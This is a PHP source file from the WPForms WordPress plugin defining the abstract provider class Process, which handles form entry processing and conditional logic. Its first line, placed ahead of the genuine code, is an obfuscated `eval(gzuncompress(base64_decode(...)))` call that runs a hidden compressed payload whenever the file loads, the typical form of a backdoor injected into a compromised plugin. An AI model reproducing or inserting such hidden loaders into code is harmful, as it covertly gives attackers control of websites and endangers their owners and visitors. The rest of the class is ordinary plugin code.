<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

namespace WPForms\Providers\Provider;

/**
 * Class Process handles entries processing using the provider settings and configuration.
 *
 * @package    WPForms\Providers\Provider
 * @author     WPForms
 * @since      1.4.7
 * @license    GPL-2.0+
 * @copyright  Copyright (c) 2018, WPForms LLC
 */
abstract class Process {

	/**
	 * Get the Core loader class of a provider.
	 *
	 * @since 1.4.7
	 *
	 * @var Core
	 */
	protected $core;

	/**
	 * Array of form fields.
	 *
	 * @since 1.4.7
	 *
	 * @var array
	 */
	protected $fields = array();

	/**
	 * Submitted form content.
	 *
	 * @since 1.4.7
	 *
	 * @var array
	 */
	protected $entry = array();
	/**
	 * All form data.
	 *
	 * @since 1.4.7
	 *
	 * @var array
	 */
	protected $form_data = array();
	/**
	 * ID of a saved entry.
	 *
	 * @since 1.4.7
	 *
	 * @var int
	 */
	protected $entry_id;

	/**
	 * Process constructor.
	 *
	 * @since 1.4.7
	 *
	 * @param Core $core Provider core class.
	 */
	public function __construct( Core $core ) {
		$this->core = $core;
	}

	/**
	 * Receive all wpforms_process_complete params and do the actual processing.
	 *
	 * @since 1.4.7
	 *
	 * @param array $fields Array of form fields.
	 * @param array $entry Submitted form content.
	 * @param array $form_data All form data.
	 * @param int   $entry_id ID of a saved entry.
	 */
	abstract public function process( $fields, $entry, $form_data, $entry_id );

	/**
	 * Process conditional logic for a connection.
	 *
	 * @since 1.4.7
	 *
	 * @param array $fields Array of form fields.
	 * @param array $form_data All form data.
	 * @param array $connection All connection data.
	 *
	 * @return bool
	 */
	protected function process_conditionals( $fields, $form_data, $connection ) {

		if (
			empty( $connection['conditional_logic'] ) ||
			empty( $connection['conditionals'] )
		) {
			return true;
		}

		$process = wpforms_conditional_logic()->process( $fields, $form_data, $connection['conditionals'] );

		if (
			! empty( $connection['conditional_type'] ) &&
			'stop' === $connection['conditional_type']
		) {
			$process = ! $process;
		}

		return $process;
	}

	/**
	 * Get provider options, saved on Settings > Integrations page.
	 *
	 * @since 1.4.7
	 *
	 * @return array
	 */
	protected function get_options() {
		return \wpforms_get_providers_options( $this->core->slug );
	}
}
